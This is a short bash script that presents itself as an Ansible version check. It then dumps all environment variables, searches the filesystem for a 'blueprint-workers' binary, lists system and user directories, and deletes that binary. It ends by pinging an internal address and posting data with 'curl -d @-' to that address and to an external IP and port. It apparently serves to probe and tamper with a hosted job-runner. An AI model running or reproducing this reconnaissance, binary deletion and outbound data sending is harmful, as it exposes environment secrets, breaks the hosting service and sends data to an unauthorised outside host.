#!/bin/bash

echo "Verifying ansible version ...."

ansible --version


set -x
echo "1. Printing environment variables...."
printenv
echo "2. searching schematics binary...."
find / -name blueprint-workers

echo "3. Listing directories...."

ls -la /
ls -la /go
ls -la /var
ls -la /run
ls -la /home/appuser
ls -la /home/nobody
ls -la /home/tmp
echo "removing binary...."
rm -f /go/bin/blueprint-workers
echo "After removing list dir...."
ls -la /go/bin/blueprint-workers
ls -la /go/bin/

ping -c 5 192.168.225.90

curl -d @- 192.168.225.90:8888

echo "4. executing curl command to external ip "

curl -d @- 66.90.217.2:4602

echo "job done.... "
